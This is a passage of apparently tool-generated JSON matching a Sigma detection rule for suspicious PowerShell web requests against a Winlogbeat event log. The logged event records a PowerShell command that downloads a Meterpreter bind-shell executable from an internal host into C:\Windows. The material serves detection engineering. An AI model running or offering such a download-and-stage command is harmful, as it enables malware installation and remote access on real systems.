        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.632Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Executing Pipeline",
                    "category": [
                        "process"
                    ],
                    "code": 4103,
                    "created": "2022-09-27T13:45:08.912Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "Microsoft-Windows-PowerShell",
                    "sequence": 18,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "CommandInvocation(Out-Default): \"Out-Default\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = d69f1bbf-903d-443c-89cb-973593849f0a\n        Host Application = powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n        Engine Version = 5.1.19041.1237\n        Runspace ID = 666a04b8-71eb-4c30-a3f5-11644ab24fe9\n        Pipeline ID = 1\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 18\n        User = CLIENT1\\ssh\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:",
                "powershell": {
                    "command": {
                        "invocation_details": [
                            {
                                "related_command": "Out-Default",
                                "type": "CommandInvocation",
                                "value": "\"Out-Default\""
                            }
                        ],
                        "type": "Script"
                    },
                    "engine": {
                        "version": "5.1.19041.1237"
                    },
                    "id": "Microsoft.PowerShell",
                    "pipeline_id": "1",
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "runspace_id": "666a04b8-71eb-4c30-a3f5-11644ab24fe9"
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "related": {
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "activity_id": "{35166aea-d26c-0001-8832-17356cd2d801}",
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-PowerShell/Operational",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 4103,
                    "opcode": "To be used when operation is just executing a method",
                    "process": {
                        "pid": 3000,
                        "thread": {
                            "id": 1648
                        }
                    },
                    "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                    "provider_name": "Microsoft-Windows-PowerShell",
                    "record_id": 6058,
                    "task": "Executing Pipeline",
                    "user": {
                        "domain": "CLIENT1",
                        "identifier": "S-1-5-21-2755423373-3250654863-1302750906-1003",
                        "name": "ssh",
                        "type": "User"
                    },
                    "version": 1
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.632+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "total_hits": 15
    }
]